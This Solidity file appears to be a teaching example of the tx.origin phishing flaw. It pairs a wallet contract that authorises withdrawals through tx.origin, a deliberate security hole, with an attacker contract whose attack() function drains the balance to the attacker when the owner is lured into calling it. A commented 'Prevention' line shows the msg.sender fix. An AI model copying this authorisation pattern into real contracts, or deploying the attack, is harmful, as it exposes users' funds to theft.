// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import '../../Common/Ownable.sol';
import 'hardhat/console.sol';

contract MyWallet is Ownable {
    uint public balance;

    function deposit() public payable onlyOwner {
        balance += msg.value;
    }

    function withdraw(address payable to) public {
        require(tx.origin == owner(), "Permission Denied");
        // Prevention
        // require(msg.sender == owner(), "Permission Denied");

        uint amount = balance;
        balance = 0;
    
        (bool sent, ) = to.call{value: amount}("");
        require(sent, "Failed to send ether");
    }
}


contract PhishingAttack is Ownable {
    MyWallet public wallet;

    constructor (MyWallet _wallet) {
        wallet = MyWallet(_wallet);
    }

    function attack() public {
        wallet.withdraw(payable(owner()));
    }
}